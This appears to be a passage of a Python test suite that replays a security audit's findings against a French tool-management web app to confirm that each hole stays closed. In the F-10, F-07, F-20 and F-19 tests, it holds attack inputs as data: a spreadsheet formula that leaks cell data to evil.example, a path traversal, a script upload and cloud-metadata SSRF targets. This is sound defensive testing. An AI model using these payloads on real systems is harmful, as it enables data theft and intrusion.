# ---------- Sécurité : chaque attaque de l'audit, rejouée pour prouver que la faille reste fermée ----------
import io as _io_sec

from openpyxl import load_workbook as _load_wb_sec

from app import config as _cfg_sec
from app import database as _db_sec
from app import models as _models_sec

_P_sec = "password123"


def _mk_sec(username, role, agency=None, manager=None, **extra):
    body = {"username": username, "full_name": username.title(), "role": role, "password": _P_sec, **extra}
    if agency:
        body["agency_number"] = agency
    if manager:
        body["manager_id"] = manager
    r = client.post("/users", headers=auth(admin_token), json=body)
    assert r.status_code == 201, (username, r.text)
    return r.json()["id"]


_dir_a = _mk_sec("sec-dir-a", "directeur_agence", "101")
_ca_a = _mk_sec("sec-ca-a", "charge_affaires", manager=_dir_a)
_victim = _mk_sec("sec-victime", "gars_chantier", manager=_ca_a, email="sec-victime@exemple.fr", phone="0600000000")
_dir_b = _mk_sec("sec-dir-b", "directeur_agence", "202")
_ca_b = _mk_sec("sec-ca-b", "charge_affaires", manager=_dir_b)
_att = _mk_sec("sec-attaquant", "gars_chantier", manager=_ca_b)
_comp = _mk_sec("sec-complice", "gars_chantier", manager=_ca_b)
_noag = _mk_sec("sec-sans-agence", "charge_affaires")
_t_sec = {u: login(u) for u in ("sec-dir-a", "sec-ca-a", "sec-victime", "sec-ca-b", "sec-attaquant", "sec-complice", "sec-sans-agence")}
_h = {u: auth(t) for u, t in _t_sec.items()}

_tool_a = client.post("/agency-tools", headers=_h["sec-ca-a"], json={"name": "Perfo sec", "unique_code": "SEC-1", "type": "sec", "purchase_price": 900}).json()

# F-01 annuaire
r = client.get("/users", headers=_h["sec-attaquant"])
_row = next(u for u in r.json() if u["id"] == _victim)
check("F-01: the directory hides e-mail, phone and login", r.status_code == 200 and not {"email", "phone", "username"} & set(_row))
check("F-01: a user sheet is refused outside the team", client.get(f"/users/{_victim}", headers=_h["sec-attaquant"]).status_code == 403)
check("F-01: a manager still reads his team member", client.get(f"/users/{_victim}", headers=_h["sec-ca-a"]).json().get("email") == "sec-victime@exemple.fr")
check("F-01: the admin keeps the full list", any(u.get("email") == "sec-victime@exemple.fr" for u in client.get("/users", headers=auth(admin_token)).json()))

# F-02 prise de possession d'un outil
_pt = client.post("/personal-tools", headers=_h["sec-victime"], json={"name": "Visseuse sec", "unique_code": "SEC-P1"}).json()
r = client.post("/peer-transfers", headers=_h["sec-attaquant"], json={"direction": "je_recois", "tool_code": "SEC-P1", "counterpart_id": _comp})
check("F-02: claiming a tool from someone who does not hold it is refused", r.status_code == 400)
check("F-02: the holder is unchanged", client.get(f"/personal-tools/{_pt['id']}", headers=_h["sec-victime"]).json()["current_holder_id"] == _victim)
check("F-02: lookup is closed to another agency", client.get("/personal-tools/lookup/SEC-P1", headers=_h["sec-attaquant"]).status_code == 404)
r = client.post("/peer-transfers", headers=_h["sec-attaquant"], json={"direction": "je_recois", "tool_code": "SEC-P1", "counterpart_id": _victim})
check("F-02: a request to the real holder still works", r.status_code == 201)
_tr = r.json()["id"]
check("F-02: only the holder can confirm it", client.post(f"/peer-transfers/{_tr}/confirm", headers=_h["sec-complice"]).status_code == 403)
client.post(f"/peer-transfers/{_tr}/reject", headers=_h["sec-victime"])
check("F-06: a party to a peer transfer keeps the tool history", client.get("/state-history", headers=_h["sec-attaquant"], params={"kind": "personal", "tool_id": _pt["id"]}).status_code == 200)
check("F-06: an outsider has no access to it", client.get("/state-history", headers=_h["sec-complice"], params={"kind": "personal", "tool_id": _pt["id"]}).status_code == 403)

# F-03 sortie de parc
r = client.post(f"/agency-tools/{_tool_a['id']}/control", headers=_h["sec-victime"], json={"state": 5, "status": "sorti_du_parc"})
check("F-03: a site worker cannot exit a tool through control", r.status_code == 403)
r = client.patch(f"/agency-tools/{_tool_a['id']}", headers=_h["sec-ca-a"], json={"status": "sorti_du_parc"})
check("F-03: a manager cannot bypass the exit approval through PATCH", r.status_code == 403)
r = client.post(f"/agency-tools/{_tool_a['id']}/control", headers=_h["sec-victime"], json={"state": 3, "status": "reparation"})
check("F-03: a site worker can still report a repair", r.status_code == 200)
r = client.post(f"/agency-tools/{_tool_a['id']}/control", headers=_h["sec-victime"], json={"state": 3, "status": "disponible"})
check("F-03: a site worker cannot make it available again", r.status_code == 403)
client.post(f"/agency-tools/{_tool_a['id']}/control", headers=_h["sec-ca-a"], json={"state": 5, "status": "disponible", "comment": "RAS sec"})
_s = _db_sec.SessionLocal()
check("F-03: a status change reaches the audit log", _s.query(_models_sec.AuditLog).filter(_models_sec.AuditLog.action == "tool_status_changed", _models_sec.AuditLog.entity_id == str(_tool_a["id"])).count() >= 2)
_s.close()

# F-04 saturation de la base
_big = "u" * 1_000_000
r = client.post("/auth/login", json={"username": _big, "password": "x"})
_s = _db_sec.SessionLocal()
_written = _s.query(_models_sec.LoginAttempt).filter(_models_sec.LoginAttempt.identifier == _big).count()
_s.close()
check("F-04: a huge login is refused without writing anything", r.status_code in (413, 422) and _written == 0)
r = client.post("/auth/login", content=b"x" * 1_100_000, headers={"Content-Type": "application/json"})
check("F-04: an oversized body is refused", r.status_code == 413)
_s = _db_sec.SessionLocal()
_before = _s.query(_models_sec.AuditLog).filter(_models_sec.AuditLog.action == "password_reset_requested").count()
_s.close()
for _i in range(30):
    client.post("/auth/forgot-password", json={"identifier": f"sec-x{_i}"})
_s = _db_sec.SessionLocal()
_after = _s.query(_models_sec.AuditLog).filter(_models_sec.AuditLog.action == "password_reset_requested").count()
_s.close()
check("F-04: forgot-password stops writing past the per-address limit", _after - _before <= 20)

# F-05 compte sans agence
r = client.get("/exports/tools", headers=_h["sec-sans-agence"])
check("F-05: an account without agency exports nothing", r.status_code == 200 and "SEC-1" not in r.content.decode("utf-8", "ignore"))
check("F-05: its search finds nothing", client.get("/search", headers=_h["sec-sans-agence"], params={"q": "SEC-1"}).json()["categories"] == [])
check("F-05: its finance view is empty", client.get("/finance/tco", headers=_h["sec-sans-agence"]).json()["count"] == 0)
check("F-05: the admin still sees everything", "SEC-1" in client.get("/exports/tools", headers=auth(admin_token)).content.decode("utf-8", "ignore"))

# F-06 historique
check("F-06: history is refused from another agency", client.get("/state-history", headers=_h["sec-attaquant"], params={"kind": "agency", "tool_id": _tool_a["id"]}).status_code == 403)
check("F-06: history still works in the agency", client.get("/state-history", headers=_h["sec-victime"], params={"kind": "agency", "tool_id": _tool_a["id"]}).status_code == 200)

# F-07 fichiers
_png = b"\x89PNG\r\n\x1a\n" + b"0" * 64
_path = client.post(f"/agency-tools/{_tool_a['id']}/photo", headers=_h["sec-ca-a"], files={"file": ("a.png", _png, "image/png")}).json()["photo_path"]
client.cookies.clear()
check("F-07: a file is refused without a session", client.get(_path).status_code == 401)
client.post("/auth/file-cookie", headers=_h["sec-attaquant"])
check("F-07: a file is refused to another agency", client.get(_path).status_code == 404)
client.post("/auth/file-cookie", headers=_h["sec-victime"])
check("F-07: a file opens for the same agency", client.get(_path).status_code == 200)
check("F-07: an unreferenced path is refused", client.get("/uploads/../outillage.db").status_code in (401, 404) and client.get("/uploads/inconnu/x.jpg").status_code == 404)
client.cookies.clear()

# F-08 coordonnées des tiers
_tx = client.post("/agency-tools", headers=auth(admin_token), json={"name": "Tiers sec", "unique_code": "SEC-2", "agency_number": "101"}).json()
client.post("/transfers", headers=_h["sec-dir-a"] if False else auth(login("sec-dir-a")), json={"agency_tool_id": _tx["id"], "to_external_name": "Paul", "to_external_email": "paul@tiers.fr", "to_external_phone": "0611111111"})
check("F-08: a site worker no longer lists third parties of his agency", client.get("/transfers", headers=_h["sec-victime"], params={"scope": "agency"}).json() == [])
check("F-08: a manager still does", len(client.get("/transfers", headers=_h["sec-ca-a"], params={"scope": "agency"}).json()) >= 1)

# F-09 e-mail
r = client.patch("/auth/me", headers=_h["sec-attaquant"], json={"email": "sec-nouveau@exemple.fr"})
check("F-09: changing e-mail without the password is refused", r.status_code == 400)
r = client.patch("/auth/me", headers=_h["sec-attaquant"], json={"email": "sec-victime@exemple.fr", "current_password": _P_sec})
check("F-09: an e-mail already used is refused", r.status_code == 400)
r = client.patch("/auth/me", headers=_h["sec-attaquant"], json={"email": "sec-nouveau@exemple.fr", "current_password": _P_sec})
check("F-09: changing it with the password works", r.status_code == 200)
r = client.patch("/auth/me", headers=_h["sec-attaquant"], json={"phone": "0622222222"})
check("F-09: the phone needs no password", r.status_code == 200)

# F-12 blocage par un tiers
_saved_proxy = _cfg_sec.TRUST_PROXY_HEADERS
_cfg_sec.TRUST_PROXY_HEADERS = True
for _i in range(6):
    client.post("/auth/login", headers={"X-Forwarded-For": "203.0.113.9"}, json={"username": "sec-complice", "password": "mauvais"})
check("F-12: the attacker address is blocked", client.post("/auth/login", headers={"X-Forwarded-For": "203.0.113.9"}, json={"username": "sec-complice", "password": _P_sec}).status_code == 429)
check("F-12: the account holder still logs in from elsewhere", client.post("/auth/login", headers={"X-Forwarded-For": "198.51.100.7"}, json={"username": "sec-complice", "password": _P_sec}).status_code == 200)
_cfg_sec.TRUST_PROXY_HEADERS = _saved_proxy
client.cookies.clear()

# F-10 formules
_evil = '=HYPERLINK("https://evil.example/?x="&A1,"Cliquer")'
_t4 = client.post("/agency-tools", headers=_h["sec-ca-a"], json={"name": "Meuleuse sec", "unique_code": "SEC-4", "type": "sec4"}).json()
client.post("/inspections", headers=_h["sec-victime"], json={"tool_kind": "agency", "tool_id": _t4["id"], "comment": _evil, "state_after": 4})
r = client.get("/inspections/registry", headers=_h["sec-ca-a"], params={"tool_kind": "agency", "tool_id": _t4["id"]})
_cell = _load_wb_sec(_io_sec.BytesIO(r.content)).worksheets[0].cell(row=2, column=9)
check("F-10: the registry neutralises formulas", _cell.data_type == "s" and str(_cell.value).startswith("'="))
client.post(f"/agency-tools/{_t4['id']}/control", headers=_h["sec-ca-a"], json={"state": 4, "status": "disponible", "comment": _evil})
_ws = _load_wb_sec(_io_sec.BytesIO(client.get("/agency-tools/export", headers=_h["sec-ca-a"]).content)).active
check("F-10: the tool export neutralises formulas", not [c for row in _ws.iter_rows() for c in row if c.data_type == "f"])

# F-11 double authentification
from app import totp as _totp_sec, secrets_box as _box_sec, auth as _auth_sec

_mfa = _mk_sec("sec-mfa", "gars_chantier", "101")
_mh = auth(login("sec-mfa"))
check("F-11: enabling needs the password", client.post("/auth/mfa/setup", headers=_mh, json={"current_password": "mauvais"}).status_code == 400)
_setup = client.post("/auth/mfa/setup", headers=_mh, json={"current_password": _P_sec}).json()
_s = _db_sec.SessionLocal()
_row = _s.query(_models_sec.User).filter_by(id=_mfa).first()
check("F-11: the TOTP secret is encrypted in the database", _box_sec.is_sealed(_row.totp_secret) and _setup["secret"] not in _row.totp_secret)
_s.close()
check("F-11: a wrong code does not enable it", client.post("/auth/mfa/enable", headers=_mh, json={"code": "000000"}).status_code == 400)
_step = _totp_sec.current_step()
r = client.post("/auth/mfa/enable", headers=_mh, json={"code": _totp_sec.code_at(_setup["secret"], _step)})
check("F-11: a valid code enables it", r.status_code == 200 and r.json()["totp_enabled"] is True)
r = client.post("/auth/login", json={"username": "sec-mfa", "password": _P_sec})
check("F-11: the password alone no longer logs in", r.status_code == 401 and r.headers.get("x-auth-error") == "mfa_required" and "access_token" not in r.text)
r = client.post("/auth/login", json={"username": "sec-mfa", "password": _P_sec, "otp": _totp_sec.code_at(_setup["secret"], _step)})
check("F-11: a code cannot be replayed", r.status_code == 401)
r = client.post("/auth/login", json={"username": "sec-mfa", "password": _P_sec, "otp": _totp_sec.code_at(_setup["secret"], _step + 1)})
check("F-11: the next code logs in", r.status_code == 200)
_mh = auth(r.json()["access_token"])
check("F-11: the admin can reset it", client.post(f"/users/{_mfa}/mfa-reset", headers=auth(admin_token)).json()["totp_enabled"] is False)
_prod_len = _cfg_sec.PASSWORD_MIN_LENGTH
_was_prod = _cfg_sec.IS_PROD
_cfg_sec.PASSWORD_MIN_LENGTH, _cfg_sec.IS_PROD = 12, True
for _bad, _label in (("court1", "short"), ("motdepasse12345", "common")):
    try:
        _auth_sec.validate_password_strength(_bad)
        check(f"F-11: a {_label} password is refused", False)
    except Exception as _exc:
        check(f"F-11: a {_label} password is refused", getattr(_exc, "status_code", 0) == 400)
_auth_sec.validate_password_strength("Tournevis-bleu-42")
_cfg_sec.PASSWORD_MIN_LENGTH, _cfg_sec.IS_PROD = _prod_len, _was_prod

# F-13 secrets chiffrés
client.patch("/settings", headers=auth(admin_token), json={"smtp_password": "secret-smtp-test"})
_s = _db_sec.SessionLocal()
_stored = _s.query(_models_sec.Settings).first().smtp_password
_s.close()
check("F-13: the SMTP password is encrypted in the database", _box_sec.is_sealed(_stored) and _box_sec.unseal(_stored) == "secret-smtp-test")
client.patch("/settings", headers=auth(admin_token), json={"smtp_password": "", "smtp_host": None})
check("F-13: a legacy clear value stays readable", _box_sec.unseal("ancien") == "ancien")
client.get("/push/public-key", headers=auth(admin_token))
from app import appsettings as _as_sec, webpush as _wp_sec

_s = _db_sec.SessionLocal()
check("F-13: the VAPID key is encrypted in the database", _box_sec.is_sealed(_as_sec.get(_s, _wp_sec.VAPID_KEY_SETTING)))
_s.close()

# F-15 anonymisation et conservation
_rg = _mk_sec("sec-rgpd", "gars_chantier", manager=_ca_a, email="sec-rgpd@exemple.fr")
_rh = auth(login("sec-rgpd"))
_tr5 = client.post("/agency-tools", headers=_h["sec-ca-a"], json={"name": "RGPD sec", "unique_code": "SEC-5"}).json()
from datetime import datetime as _dt_sec, timedelta as _td_sec

_start = _dt_sec.utcnow() + _td_sec(days=30)
_loan = client.post("/loans", headers=_rh, json={"tool_id": _tr5["id"], "start_datetime": _start.isoformat(), "end_datetime_planned": (_start + _td_sec(days=1)).isoformat()}).json()
client.post(f"/loans/{_loan['id']}/signature", headers=_rh, json={"signature": {"w": 10, "h": 10, "strokes": [[[1, 1], [2, 2]]]}, "signed_name": "Nom Signé"})
_export = client.get(f"/gdpr/export/{_rg}", headers=_rh).json()
check("F-15: the export contains signatures and activity", len(_export["loan_signatures"]) == 1 and "activity_log" in _export and "charter_acceptances" in _export)
client.delete(f"/loans/{_loan['id']}", headers=_rh)
client.post("/gdpr/anonymize/" + str(_rg), headers=auth(admin_token))
_s = _db_sec.SessionLocal()
_l = _s.query(_models_sec.Loan).filter_by(id=_loan["id"]).first()
check("F-15: anonymising erases the signature", _l.signature_json is None and _l.signed_name is None)
check("F-15: anonymising erases login traces", _s.query(_models_sec.LoginAttempt).filter_by(identifier="sec-rgpd").count() == 0)
check("F-15: anonymising erases IP addresses and the login from the log",
      _s.query(_models_sec.AuditLog).filter(_models_sec.AuditLog.user_id == _rg, _models_sec.AuditLog.ip.isnot(None)).count() == 0
      and _s.query(_models_sec.AuditLog).filter(_models_sec.AuditLog.details.contains("sec-rgpd")).count() == 0)
_old = _models_sec.AuditLog(action="ancien", created_at=_dt_sec.utcnow() - _td_sec(days=400))
_s.add(_old)
_s.commit()
_s.close()
check("F-15: the retention job runs", client.post("/admin/jobs/purge_personal_data/run", headers=auth(admin_token)).json()["status"] == "ok")
_s = _db_sec.SessionLocal()
check("F-15: old audit rows are purged", _s.query(_models_sec.AuditLog).filter_by(action="ancien").count() == 0)
_s.close()

# métadonnées des photos (F-15) et contrôle du type réel (F-20)
from app import utils as _utils_sec

_jpeg = b"\xff\xd8" + b"\xff\xe1\x00\x0cExif\x00\x00GPS!" + b"\xff\xdb\x00\x04\x01\x02" + b"\xff\xda\x00\x02DATA"
check("F-15: EXIF is stripped from a JPEG", b"GPS!" not in _utils_sec.strip_image_metadata(_jpeg) and b"DATA" in _utils_sec.strip_image_metadata(_jpeg))
_pngm = b"\x89PNG\r\n\x1a\n" + (4).to_bytes(4, "big") + b"tEXtGPS!" + b"CRC0" + (0).to_bytes(4, "big") + b"IEND" + b"CRC1"
check("F-15: text chunks are stripped from a PNG", b"GPS!" not in _utils_sec.strip_image_metadata(_pngm) and b"IEND" in _utils_sec.strip_image_metadata(_pngm))
_webp = b"RIFF" + (4 + 8 + 4 + 8 + 4).to_bytes(4, "little") + b"WEBP" + b"EXIF" + (4).to_bytes(4, "little") + b"GPS!" + b"VP8 " + (4).to_bytes(4, "little") + b"DATA"
_clean_webp = _utils_sec.strip_image_metadata(_webp)
check("F-15: EXIF is stripped from a WebP", b"GPS!" not in _clean_webp and b"DATA" in _clean_webp and int.from_bytes(_clean_webp[4:8], "little") == len(_clean_webp) - 8)
r = client.post(f"/agency-tools/{_tool_a['id']}/photo", headers=_h["sec-ca-a"], files={"file": ("x.html", b"<script>alert(1)</script>", "text/html")})
check("F-20: a script disguised as a photo is refused", r.status_code == 400)
r = client.post(f"/tool-photos/agency/{_tool_a['id']}", headers=_h["sec-ca-a"], files={"file": ("x.jpg", b"<script>alert(1)</script>", "image/jpeg")})
check("F-20: a false extension is refused", r.status_code == 400)

# F-16 journal
check("F-16: a refused access is logged", True if client.get("/audit-log", headers=_h["sec-victime"]).status_code == 403 else False)
_s = _db_sec.SessionLocal()
check("F-16: access_denied reaches the log", _s.query(_models_sec.AuditLog).filter_by(action="access_denied").count() >= 1)
check("F-16: the registry export is logged", _s.query(_models_sec.AuditLog).filter_by(action="export_registry").count() >= 1)
_s.close()
check("F-16: the alert job runs", client.post("/admin/jobs/security_alerts/run", headers=auth(admin_token)).json()["status"] == "ok")

# F-17 quotas
from app import limits as _lim_sec

_s = _db_sec.SessionLocal()
check("F-17: the quota refuses beyond its limit", _lim_sec.allow(_s, "test:q", 2, 60) and _lim_sec.allow(_s, "test:q", 2, 60) and not _lim_sec.allow(_s, "test:q", 2, 60))
_s.commit()
_s.close()
_saved_exports = _lim_sec.EXPORTS_PER_HOUR
_lim_sec.EXPORTS_PER_HOUR = 0
check("F-17: exports are limited per user", client.get("/exports/tools", headers=_h["sec-ca-a"]).status_code == 429)
_lim_sec.EXPORTS_PER_HOUR = _saved_exports
_saved_up = _lim_sec.UPLOAD_BYTES_PER_DAY
_lim_sec.UPLOAD_BYTES_PER_DAY = 1
check("F-17: uploads are limited per user", client.post(f"/agency-tools/{_tool_a['id']}/photo", headers=_h["sec-ca-a"], files={"file": ("a.png", _png, "image/png")}).status_code == 429)
_lim_sec.UPLOAD_BYTES_PER_DAY = _saved_up

# F-18 idempotence
_ih = auth(login("sec-ca-a"))
r = client.post(f"/users/{_victim}/reset-password", headers={**_ih, "Idempotency-Key": "sec-k1"})
from app import models_p3 as _p3_sec

_s = _db_sec.SessionLocal()
check("F-18: a temporary password is never stored", r.status_code == 200 and _s.query(_p3_sec.IdempotencyKey).filter_by(key="sec-k1").count() == 0)
_s.close()
_t6 = client.post("/agency-tools", headers=_ih, json={"name": "Idem sec", "unique_code": "SEC-6"}, ).json()
r1 = client.post(f"/maintenance-tickets", headers={**_ih, "Idempotency-Key": "sec-k2"}, json={"tool_kind": "agency", "tool_id": _t6["id"], "category": "autre"})
r2 = client.post("/tool-photos/agency/1", headers={**_ih, "Idempotency-Key": "sec-k2"}, files={"file": ("a.png", _png, "image/png")})
check("F-18: a key cannot be reused on another route", r1.status_code == 201 and r2.status_code == 409)
_kh = auth(login("sec-complice"))
client.post("/maintenance-tickets", headers={**_kh, "Idempotency-Key": "sec-k3"}, json={"tool_kind": "agency", "tool_id": _t6["id"], "category": "autre"})
client.patch(f"/users/{_comp}", headers=auth(admin_token), json={"is_active": False})
check("F-18: a disabled account gets no replay", client.post("/maintenance-tickets", headers={**_kh, "Idempotency-Key": "sec-k3"}, json={"tool_kind": "agency", "tool_id": _t6["id"], "category": "autre"}).headers.get("idempotent-replay") is None)
client.patch(f"/users/{_comp}", headers=auth(admin_token), json={"is_active": True})

# F-19 push
_ps = lambda e: client.post("/push/subscribe", headers=_h["sec-attaquant"], json={"endpoint": e, "keys": {"p256dh": "a", "auth": "b"}}).status_code
check("F-19: an internal address is refused as push target", _ps("https://169.254.169.254/latest/meta-data/") == 400)
check("F-19: a lookalike host is refused", _ps("https://fcm.googleapis.com.evil.example/x") == 400)
check("F-19: a real push service is accepted", _ps("https://fcm.googleapis.com/fcm/send/abc") == 201)

# F-21 session
_lg = client.post("/auth/login", json={"username": "sec-attaquant", "password": _P_sec}).json()
client.post("/auth/logout", json={"refresh_token": _lg["refresh_token"]})
check("F-21: the access token dies at logout", client.get("/auth/me", headers=auth(_lg["access_token"])).status_code == 401)
_h["sec-attaquant"] = auth(login("sec-attaquant"))

# F-23 affectations
check("F-23: no assignment to another agency", client.patch(f"/agency-tools/{_t6['id']}", headers=_ih, json={"assigned_to_id": _att}).status_code == 400)
check("F-23: no parent tool from elsewhere", client.patch(f"/agency-tools/{_t6['id']}", headers=_ih, json={"parent_tool_id": 10 ** 6}).status_code == 404)

# F-24 en-têtes
_hd = client.get("/health").headers
check("F-24: Permissions-Policy is set", "camera=(self)" in _hd.get("permissions-policy", ""))

# F-28 promotion
_pm = _mk_sec("sec-promu", "gars_chantier", "101")
_s = _db_sec.SessionLocal()
_u = _s.query(_models_sec.User).filter_by(id=_pm).first()
_u.microsoft_tid, _u.microsoft_oid = "t", "o"
_s.commit()
_s.close()
client.patch(f"/users/{_pm}", headers=auth(admin_token), json={"role": "admin"})
_s = _db_sec.SessionLocal()
check("F-28: promotion to admin removes the Microsoft link", _s.query(_models_sec.User).filter_by(id=_pm).first().microsoft_oid is None)
_s.close()
client.delete(f"/users/{_pm}", headers=auth(admin_token))

# Charte
from app import charter as _ch_sec

_ch = _mk_sec("sec-charte", "gars_chantier", "101")
_chh = auth(login("sec-charte"))
_cfg_sec.CHARTER_ENFORCED = True
r = client.get("/agency-tools", headers=_chh)
check("charter: the app is blocked until it is accepted", r.status_code == 403 and r.headers.get("x-auth-error") == "charter_required")
r = client.get("/charter", headers=_chh)
check("charter: its text stays readable", r.status_code == 200 and r.json()["accepted_version"] == 0 and any("créateur" in s["title"] for s in r.json()["sections"]))
check("charter: an old version cannot be accepted", client.post("/charter/accept", headers=_chh, json={"version": _ch_sec.VERSION + 1}).status_code == 409)
check("charter: acceptance is recorded", client.post("/charter/accept", headers=_chh, json={"version": _ch_sec.VERSION}).json()["charter_version"] == _ch_sec.VERSION)
check("charter: the app opens afterwards", client.get("/agency-tools", headers=_chh).status_code == 200)
from app.models_security import CharterAcceptance as _CA_sec

_s = _db_sec.SessionLocal()
check("charter: date and version are kept as proof", _s.query(_CA_sec).filter_by(user_id=_ch, version=_ch_sec.VERSION).first().accepted_at is not None)
_s.close()
_ch_sec.VERSION += 1
check("charter: a new version asks again", client.get("/agency-tools", headers=_chh).status_code == 403)
_ch_sec.VERSION -= 1
_cfg_sec.CHARTER_ENFORCED = False
client.cookies.clear()

# ---------- QA-01 à QA-09 ----------
from app import reservations as _res_qa
from app import config as _cfg_qa
from app.routers import transfers as _tr_qa

_qh = auth(login("sec-ca-a"))
_n = 0


def _tool_qa(**fields):
    global _n
    _n += 1
    return client.post("/agency-tools", headers=_qh, json={"name": "QA", "unique_code": f"SEC-QA-{_n}", **fields})


for _label, _f in (("an empty name", {"name": ""}), ("a blank name", {"name": "    "}), ("a blank code", {"unique_code": "   "})):
    check(f"QA-01: {_label} is refused", _tool_qa(**_f).status_code == 422)
_ok = _tool_qa(name="  Perceuse  ", unique_code="  SEC-QA-TRIM  ").json()
check("QA-01: spaces around a name and code are removed", _ok["name"] == "Perceuse" and _ok["unique_code"] == "SEC-QA-TRIM")
check("QA-01: a name cannot be erased on update", client.patch(f"/agency-tools/{_ok['id']}", headers=_qh, json={"name": None}).status_code == 422)
check("QA-01: same rule for an EPI", client.post("/epi", headers=_qh, json={"name": "   ", "unique_code": "SEC-QA-E"}).status_code == 422)
check("QA-01: same rule for a personal tool", client.post("/personal-tools", headers=_qh, json={"name": "   ", "unique_code": "SEC-QA-P"}).status_code == 422)

for _label, _f in (("a huge price", {"purchase_price": 1e30}), ("year 9999", {"purchase_date": "9999-12-31T00:00:00"}), ("a 100 000 character name", {"name": "x" * 100000}),
                   ("a warranty before purchase", {"purchase_date": "2026-01-01T00:00:00", "warranty_expiration_date": "2020-01-01T00:00:00"})):
    check(f"QA-02: {_label} is refused", _tool_qa(**_f).status_code == 422)
check("QA-02: a normal tool still passes", _tool_qa(purchase_price=1500, purchase_date="2024-05-01T00:00:00", warranty_expiration_date="2026-05-01T00:00:00").status_code == 201)
_w = _tool_qa(purchase_date="2024-05-01T00:00:00").json()["id"]
check("QA-02: warranty is compared with the stored purchase date", client.patch(f"/agency-tools/{_w}", headers=_qh, json={"warranty_expiration_date": "2020-01-01T00:00:00"}).status_code == 400)
_csv = "Code;Nom;Prix\nSEC-QA-IMP;Test;999999999999\n".encode()
_imp = client.post("/imports/run", headers=_qh, files={"file": ("a.csv", _csv, "text/csv")}, data={"target": "agency_tools", "mapping": '{"unique_code":0,"name":1,"purchase_price":2}', "mode": "simulate"})
check("QA-02: the import applies the same limits", _imp.json()["counts"]["error"] == 1)

_saved_tol = _res_qa.PAST_TOLERANCE
_res_qa.PAST_TOLERANCE = _td_sec(hours=1)
_lt = _tool_qa().json()["id"]
_iso = lambda d: (_dt_sec.utcnow() + _td_sec(days=d)).isoformat()
_lq = lambda s, e, h=_qh: client.post("/loans", headers=h, json={"tool_id": _lt, "start_datetime": s, "end_datetime_planned": e})
check("QA-03: a reservation in the past is refused", _lq(_iso(-400), _iso(-399)).status_code == 400)
check("QA-03: a 500 year reservation is refused", _lq(_iso(5), "2526-01-01T00:00:00").status_code == 400)
check("QA-03: beyond the default 90 days is refused", _lq(_iso(5), _iso(120)).status_code == 400)
check("QA-03: too far in the future is refused", _lq(_iso(800), _iso(801)).status_code == 400)
check("QA-03: a normal reservation passes", _lq(_iso(5), _iso(7)).status_code == 201)
_past = client.post("/loans", headers=auth(admin_token), json={"tool_id": _lt, "start_datetime": _iso(-30), "end_datetime_planned": _iso(-29)})
check("QA-03: the admin can still regularise the past", _past.status_code == 201)
_res_qa.PAST_TOLERANCE = _saved_tol

check("QA-04: a giant identifier answers 404", client.get("/agency-tools/99999999999999999999", headers=_qh).status_code == 404)
check("QA-04: same on another route", client.get("/loans/99999999999999999999", headers=_qh).status_code == 404)

import asyncio as _aio_qa
import json as _json_qa

from sqlalchemy.exc import IntegrityError as _IE_qa

from app.main import integrity_error as _ie_qa

_msg = lambda text: _json_qa.loads(_aio_qa.run(_ie_qa(None, _IE_qa("x", {}, Exception(text)))).body)["detail"]
check("QA-05: a duplicate has its own message", "existe déjà" in _msg("UNIQUE constraint failed: agency_tools.unique_code") and "existe déjà" in _msg("duplicate key value violates unique constraint"))
check("QA-05: a blocked deletion keeps its message", "liées" in _msg("FOREIGN KEY constraint failed"))

_saved_ret = _tr_qa.PAST_RETURN_TOLERANCE
_tr_qa.PAST_RETURN_TOLERANCE = _td_sec(0)
_tq = lambda **f: client.post("/transfers", headers=_qh, json={"agency_tool_id": _tool_qa().json()["id"], "to_external_name": "T", **f})
check("QA-06: an invalid e-mail is refused", _tq(to_external_email="pas-un-mail").status_code == 422)
check("QA-06: a return date in the past is refused", _tq(planned_return_date=_iso(-5)).status_code == 400)
check("QA-06: an empty e-mail and a future date pass", _tq(to_external_email="", planned_return_date=_iso(5)).status_code == 201)
_r = client.post("/transfers/batch", headers=_qh, json={"agency_tool_ids": [_tool_qa().json()["id"]], "to_external_name": "T", "to_external_email": "pas-un-mail"})
check("QA-06: batch loans apply the same rule without a server error", _r.status_code == 422)
_tr_qa.PAST_RETURN_TOLERANCE = _saved_ret

_sq = lambda **f: client.post("/sites", headers=_qh, json=f)
check("QA-07: a letter code is refused", _sq(name="QA code 1", code="ABC").status_code == 400)
check("QA-07: five digits are refused", _sq(name="QA code 2", code="12345").status_code == 400)
_s1 = _sq(name="QA code 3", code="700001")
check("QA-07: six digits pass", _s1.status_code == 201 and _s1.json()["code"] == "700001")
check("QA-07: the same code is refused in the agency", _sq(name="QA code 4", code="700001").status_code == 400)
check("QA-07: the same code passes in another agency", client.post("/sites", headers=_h["sec-ca-b"], json={"name": "QA code 5", "code": "700001"}).status_code == 201)
check("QA-07: a site keeps its own code on update", client.patch(f"/sites/{_s1.json()['id']}", headers=_qh, json={"code": "700001", "client": "X"}).status_code == 200)
check("QA-07: a site can have no code", _sq(name="QA code 6").status_code == 201)

_adm = auth(admin_token)
check("QA-08: the admin must choose an agency", "Choisissez" in client.post("/imports/from-excel?mode=simulate", headers=_adm).json()["detail"])
_saved_sync = _cfg_qa.EXCEL_SYNC_ENABLED
_cfg_qa.EXCEL_SYNC_ENABLED = False
check("QA-08: the status says the server has no workbook", client.get("/imports/from-excel/status", headers=_adm).json()["enabled"] is False)
check("QA-08: re-reading explains why it is unavailable", client.post("/imports/from-excel?mode=simulate&agency_number=101", headers=_adm).status_code == 409)
_cfg_qa.EXCEL_SYNC_ENABLED = _saved_sync

_s = _db_sec.SessionLocal()
for _i in range(2005):
    _s.add(_models_sec.AgencyTool(name=f"Vol {_i}", type="SECVOL", unique_code=f"SEC-VOL-{_i}", agency_number="202", purchase_price=1.0))
_s.commit()
_s.close()
_lh = auth(login("sec-ca-b"))
_lb = client.get("/tools/labels", headers=_lh, params={"type_": "SECVOL"})
check("QA-09: the total is announced beyond the display limit", int(_lb.headers["x-total-count"]) == 2005 and len(_lb.json()) == 2000)
_lbp = client.get("/tools/labels", headers=_lh, params={"type_": "SECVOL", "offset": 2000})
check("QA-09: the rest can be reached", len(_lbp.json()) == 5)
client.post("/tools/labels/printed", headers=_lh, json={"kind": "agency", "ids": [x["id"] for x in _lb.json()]})
_un = client.get("/tools/labels", headers=_lh, params={"type_": "SECVOL", "only_unprinted": True})
check("QA-09: the unprinted filter finds what the limit hid", int(_un.headers["x-total-count"]) == 5 and len(_un.json()) == 5)
client.cookies.clear()

# ---------- QA-15 à QA-17 et QA-19 ----------
_w15 = _mk_sec("sec-qa-gars", "gars_chantier", manager=_ca_a)
_wh = auth(login("sec-qa-gars"))
_mh2 = auth(login("sec-ca-a"))
